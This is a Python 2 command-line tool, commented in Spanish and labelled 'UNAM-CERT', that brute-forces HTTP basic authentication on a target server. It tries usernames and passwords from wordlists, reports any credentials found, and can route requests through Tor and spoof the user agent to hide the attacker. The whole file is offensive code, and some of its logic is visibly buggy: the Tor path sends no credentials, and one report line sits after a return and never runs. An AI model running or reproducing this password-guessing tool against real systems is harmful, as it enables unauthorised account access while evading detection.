#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
import requests
from requests import get
from datetime import datetime
from requests.exceptions import ConnectionError



def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)
            
def readFiles(a,t,v,r,host, users, passwords):
	'''
	Funcion que aplica la conexion a una lista de usuarios y una lista
	de passwords leidos de archivos.
	v: Parametro que identifica si se aplicara o no el modo 'verbose'
	r: Parametro que identifica si se guardara el reporte en un nuevo archivo
	host: El host al cual se realizara el request
	users: Archivo con lista de usuarios
	passwords: Archivo con lista de passwords
	'''
	if v:
		print 'Se itentan leer los archivos'
	with open(users,'r') as usuarios, open(passwords, 'r') as passwd:
		usert=usuarios.read()
		passwdt=passwd.read()
		result = False
		for u in usert.splitlines():
			if result== True:
				break
			else:
				for p in passwdt.splitlines():
					result= makeRequest(host,u,p,v,r,t,a)
				
		
	
def addOptions():
    '''
    Funcion que permite agregar las banderas correspondientes para el uso del
    programa ejecutado como script.
    '''
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-v','--verbose', action='store_true', dest='verbose', default=False, help='Show the process in verbose mode')
    parser.add_option('-t','--tor', action='store_true', dest='tor', default=False, help='Anonimous request with Tor')
    parser.add_option('-a','--agent', action='store_true', dest='agent', default=False, help='Change user agent')
    parser.add_option('-r','--reporte', dest='reporte', default=None, help='File where the findigns will be stored')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-l', '--listU', dest='users', default=None, help='File whits users.')
    parser.add_option('-L', '--listP', dest='passwords', default=None, help='File whit passwords.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    '''
    Funcion que valida que todas las opciones obligatorias se hayan agregado
    '''
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if options.user is None and options.users is None:
        printError('Debes especificar un usuario o archivo que contenga una lista de usuarios', True)
    if options.password is None and options.passwords is None:
        printError('Debes especificar un password o archivo que contenga una lista de passwords', True)

def reportResults(r,cadenaRes):
	with open(r,'a') as archivo:
		archivo.write(cadenaRes+'Hora: '+str(datetime.now())+'\n')


def buildURL(v,server,port,protocol = 'http'):
    '''
    funcion que construye una url de acuerdo a los valores que se le pasan
    '''
    url = '%s://%s:%s' % (protocol,server,port)
    if v:
		print 'Se obtuvo la URL: '+url+'\n'
    return url


def makeRequest(host, user, password, v,r,t,a):
    '''
    Funcion que genera la peticion al host especificado con las credenciales del
    user (usuario) que se pasa como parametro.
    host: El host al que se realizara la peticion
    user: El usuario con el que se intentara hacer la validacion
    password: El password con el que se intentara hacer la validacion
    v: Parametro que identificara si se imprimira el proceso (modo verbose)
    r: Parametro que indica el archivo en el que se imprimira el reporte (si se le pasa)
    '''
    exitoso=False
    cadenaRes=''
    try:
		if v:
			print 'Se genera la peticion...\n'
		if t:
			#Para generar la peticion anonima
			sesion= requests.session()
			sesion.proxies={}
			sesion.proxies['http']='socks5://localhost:9050'
			sesion.proxies['https']='socks5://localhost:9050'
			if a: #Si tiene la bandera de cambiar el agente
				headers={}
				headers['User-agent']='Mozilla/5.0 (Macintosh; Intel Mac Os X x.y; rv:42.0) Gecko/20100101 Firefox/42.0'
				response= sesion.get(host, headers=headers)
			else:#Si no es necesario cambiar el agente
				response= sesion.get(host)
		else:
			response = get(host, auth=(user,password))
		if response.status_code == 200:
			print response.text
			print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
			return True
			cadenaRes='Se encontraron las credenciales: \n url:'+host+' usuario:'+ user+'  password:'+password+'\n'
		else:
			print 'NO FUNCIONO :c '
			cadenaRes='No se encontraron las credenciales: \n url:'+host+' usuario:'+ user+'  password:'+password+'\n'
		if r:
			#Si se le pasa el archivo para el reporte, se escribe el reporte
			reportResults(r,cadenaRes)
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
	return exitoso

if __name__ == '__main__':
	try:
		opts = addOptions()
		checkOptions(opts)
		url = buildURL(opts.verbose,opts.server,port = opts.port)
		if opts.users:
			readFiles(opts.agent,opts.tor,opts.verbose,opts.reporte,url,opts.users,opts.passwords)
		else:
			print 'algo'
			makeRequest(url, opts.user, opts.password, opts.verbose, opts.reporte, opts.tor, opts.agent)
	except Exception as e:
		printError('Ocurrio un error inesperado')
		printError(e, True)
